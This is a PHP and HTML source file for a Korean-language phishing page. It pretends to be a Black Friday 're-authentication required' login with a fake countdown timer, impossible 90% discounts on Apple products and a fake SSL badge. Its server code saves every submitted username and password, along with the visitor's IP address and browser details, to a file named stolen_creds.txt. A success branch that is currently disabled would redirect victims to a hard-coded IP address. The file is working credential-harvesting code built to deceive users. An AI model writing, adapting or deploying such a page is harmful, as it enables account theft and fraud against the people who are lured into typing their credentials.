<?php
// bf2025.php 상단에 에러 표시 추가
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();

// 로그인 시도 처리
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // 디버깅: 입력값 확인
    echo "Debug - Username: " . $username . "<br>";
    echo "Debug - Password: " . $password . "<br>";
    
    // 로그 파일 경로 (절대 경로로 지정)
    $log_file = __DIR__ . '/stolen_creds.txt';
    
    // 디버깅: 파일 경로 확인
    echo "Debug - Log file path: " . $log_file . "<br>";
    echo "Debug - Directory writable: " . (is_writable(__DIR__) ? 'Yes' : 'No') . "<br>";
    
    // 훔친 정보 로그 저장
    $log_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
        'page' => 'bf2025.php'
    ];
    
    $log_line = json_encode($log_data) . "\n";
    
    // 파일 쓰기 시도
    $result = file_put_contents($log_file, $log_line, FILE_APPEND | LOCK_EX);
    
    // 디버깅: 결과 확인
    if ($result === false) {
        echo "Debug - Failed to write to file!<br>";
        echo "Debug - PHP Error: " . error_get_last()['message'] . "<br>";
    } else {
        echo "Debug - Successfully wrote " . $result . " bytes<br>";
    }
    
    // 테스트를 위해 리다이렉트 비활성화
    // $success_message = true;
    die(); // 여기서 멈춤
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>보안 인증 - 블랙프라이데이 특별 할인</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        
        .black-friday-banner {
            background: #000;
            color: #FFD700;
            padding: 15px;
            text-align: center;
            margin: -40px -40px 30px -40px;
            border-radius: 10px 10px 0 0;
            position: relative;
            overflow: hidden;
        }
        
        .black-friday-banner::before {
            content: '🛍️';
            position: absolute;
            font-size: 100px;
            opacity: 0.1;
            right: -20px;
            top: -20px;
        }
        
        .black-friday-banner h2 {
            font-size: 24px;
            margin-bottom: 5px;
            position: relative;
            z-index: 1;
        }
        
        .black-friday-banner p {
            font-size: 14px;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }
        
        .alert {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }
        
        .alert-icon {
            font-size: 24px;
            margin-right: 10px;
        }
        
        .alert-text {
            flex: 1;
        }
        
        .alert-text strong {
            display: block;
            margin-bottom: 5px;
        }
        
        .success-message {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
            text-align: center;
        }
        
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e4e8;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .login-button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .login-button:hover {
            transform: translateY(-2px);
        }
        
        .timer {
            background: #dc3545;
            color: white;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        .offer-preview {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
            border: 2px dashed #dee2e6;
        }
        
        .offer-preview h3 {
            color: #dc3545;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .offer-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding: 5px 0;
        }
        
        .original-price {
            text-decoration: line-through;
            color: #999;
        }
        
        .discount-price {
            color: #dc3545;
            font-weight: bold;
            font-size: 18px;
        }
        
        .security-notice {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #6c757d;
            font-size: 14px;
        }
        
        .security-notice svg {
            width: 16px;
            height: 16px;
            margin-right: 5px;
            fill: #28a745;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="black-friday-banner">
            <h2>BLACK FRIDAY</h2>
            <p>최대 90% 할인 - 한정 수량!</p>
        </div>
        
        <?php if (isset($success_message) && $success_message): ?>
        <div class="success-message">
            ✅ 인증 중입니다... 잠시만 기다려주세요.
        </div>
        <script>
            setTimeout(function() {
                alert('세션이 만료되었습니다. 다시 로그인해주세요.');
                window.location.href = 'http://3.35.218.180';
            }, 2000);
        </script>
        <?php else: ?>
        
        <div class="alert">
            <span class="alert-icon">⚠️</span>
            <div class="alert-text">
                <strong>세션이 만료되었습니다</strong>
                보안을 위해 다시 로그인해주세요
            </div>
        </div>
        
        <div class="timer pulse" id="timer">
            ⏰ 남은 시간: <span id="countdown">14:59</span>
        </div>
        
        <h1>재인증 필요</h1>
        <p class="subtitle">블랙프라이데이 할인을 받으려면 로그인하세요</p>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="username">아이디</label>
                <input type="text" id="username" name="username" required 
                       placeholder="아이디를 입력하세요" autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">비밀번호</label>
                <input type="password" id="password" name="password" required 
                       placeholder="비밀번호를 입력하세요" autocomplete="current-password">
            </div>
            
            <button type="submit" class="login-button">
                🔐 안전하게 로그인
            </button>
        </form>
        
        <div class="offer-preview">
            <h3>🎁 로그인 후 받을 수 있는 혜택</h3>
            <div class="offer-item">
                <span>아이폰 15 Pro</span>
                <span>
                    <span class="original-price">1,500,000원</span>
                    →
                    <span class="discount-price">150,000원</span>
                </span>
            </div>
            <div class="offer-item">
                <span>맥북 프로 14</span>
                <span>
                    <span class="original-price">3,000,000원</span>
                    →
                    <span class="discount-price">300,000원</span>
                </span>
            </div>
            <div class="offer-item">
                <span>에어팟 프로</span>
                <span>
                    <span class="original-price">350,000원</span>
                    →
                    <span class="discount-price">35,000원</span>
                </span>
            </div>
        </div>
        
        <div class="security-notice">
            <svg viewBox="0 0 20 20">
                <path d="M2.93 17.07A10 10 0 1 1 17.07 2.93 10 10 0 0 1 2.93 17.07zm12.73-1.41A8 8 0 1 0 4.34 4.34a8 8 0 0 0 11.32 11.32zM9 11V9h2v6H9v-4zm0-6h2v2H9V5z"/>
            </svg>
            SSL 보안 연결
        </div>
        
        <?php endif; ?>
    </div>
    
    <script>
        // 카운트다운 타이머
        let minutes = 14;
        let seconds = 59;
        
        function updateTimer() {
            const countdownEl = document.getElementById('countdown');
            
            if (seconds === 0) {
                if (minutes === 0) {
                    countdownEl.textContent = "종료됨";
                    document.querySelector('.timer').style.background = '#6c757d';
                    return;
                }
                minutes--;
                seconds = 59;
            } else {
                seconds--;
            }
            
            countdownEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }
        
        setInterval(updateTimer, 1000);
        
        // 폼 제출시 로딩 효과
        document.querySelector('form')?.addEventListener('submit', function() {
            const button = document.querySelector('.login-button');
            button.textContent = '🔄 로그인 중...';
            button.disabled = true;
        });
    </script>
</body>
</html>
